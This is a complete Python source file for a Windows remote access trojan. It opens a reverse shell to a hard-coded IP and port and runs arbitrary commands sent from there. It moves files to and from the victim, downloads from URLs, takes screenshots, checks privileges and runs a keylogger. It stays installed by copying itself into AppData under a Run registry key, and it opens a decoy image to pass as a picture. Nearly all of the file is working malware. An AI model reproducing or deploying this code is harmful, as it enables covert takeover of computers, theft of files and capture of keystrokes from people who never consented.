# !/usr/bin/python
import socket
import subprocess # this allow us to input something in the cli
import json
import time
import os
import shutil # screenshot
import sys # use in copy function
import base64
import requests
from mss import mss
import keylogger
import threading




# trying to retyr the connection
def connection():
	global sock
	while True:
		time.sleep(5)
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # IPv4 and TCP
			sock.connect(("192.168.88.103", 54321))
			shell()
		except:
			connection()




def is_admin():
	global admin
	try:
		temp = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\windows'), 'temp']))
	except:
		admin = "User Previleges"
	else:
		admin = "Admin Priviliges"




# we gonna send send and receive data as wew want ==
def reliable_send(data):
        json_data = json.dumps(data)
         # print("testing the json send: "+json_data)
        sock.send(json_data)

def reliable_rcv():
        json_data = ""
        # run loop to add data
        while True:
                try:
                        json_data = json_data + sock.recv(1024)
                        # print("testing the json data receving: " + json_data)
                        # print("print the json loads: "+ json.loads(json_data))
                        return json.loads(json_data)
                except ValueError:
                        # print("reliable_rcv except (continue)..")
                        continue



def screenshot():
	with mss() as ss:
		ss.shot()



def download(url):
	get_response = requests.get(url)
	file_name =  url.split("/")[-1]
	with open(file_name, "wb") as out_file:
		out_file.write(get_response.content)




def shell():
	while True:
		command = reliable_rcv() # receive bytes
		if command  == "q":
			try:
				os.remove(keylogger_path)
			except:
				continue
			break
		elif command[:2] == "cd" and len(command) > 1:
			try:
				os.chdir(command[3:])
			except:
				continue
		elif command[:8] == "download":
			# file = open(command[9:], "wb")  # you can this also
			with open(command[9:], "rb") as file:
				reliable_send(base64.b64encode(file.read()))
		elif command[:6] == "upload":
	                with open(command[7:], "wb") as fin:
                                result = reliable_rcv()
				fin.write(base64.b64decode(result))
		elif command[:3] == "get":
			try:
				download(command[4:])
				reliable_send("[+] Download File From Specified URL")
			except:
				reliable_send("[!!] Failed to Download the file")
		elif command[:5] == "start":
			try:
				subprocess.Popen(command[6:], shell=True)
				reliable_send("[+] Started")
			except:
				reliable_send("[!!] Failed To Start")
		elif command[:10] == "screenshot":
			try:
				screenshot()
				with open("monitor-1.png", "rb") as sc:
					reliable_send(base64.b64encode(sc.read()))
				os.remove("monitor-1.png")
			except:
				reliable_send("[!!] Failed to take Screenshot")
		elif command[:5] =="check":
			try:
				is_admin()
				reliable_send(admin)
			except:
				reliable_send("Can't Perform")
		elif command[:4] == "help":
			help_options = """
			download path           -> Download from target PC
			upload  path            -> Upload A file to Target PC
			get url                 -> Download File to the target from any website
			start path              -> Start Program on target PC
			screenshot              -> Take A screenshot
			check                   -> Check for Privileges
			keylog_start            -> Start log
			keylog_dump             -> print out log
			q                       -> Exit the Program
			"""
			reliable_send(help_options)
		elif command[:12] == "keylog_start":
			t1 = threading.Thread(target=keylogger.start)
			t1.start()
		elif command[:11] == "keylog_dump":
			fn = open(keylogger_path, "r")
			reliable_send(fn.read())
		else:
			try:
				process = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE, stderr = subprocess.PIPE, stdin=subprocess.PIPE)
				result = process.stdout.read() + process.stderr.read()
				reliable_send(result)

			except:
				reliable_send("CAN'T EXECUTE THE COMMAND!!!")

location = os.environ["appdata"] + "\\win.exe"
keylogger_path = os.environ["appdata"] + "\\keylogger.txt"
if not os.path.exists(location):
	shutil.copyfile(sys.executable, location)
	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v win /t REG_SZ /d "' + location + '"', shell=True)

	name = sys._MEIPASS + "\pic.jpg"
	try:
		subprocess.Popen(name, shell = True)
	except:
		number  = 3
		number1 = 5
		add = number + number1

connection()
sock.close()
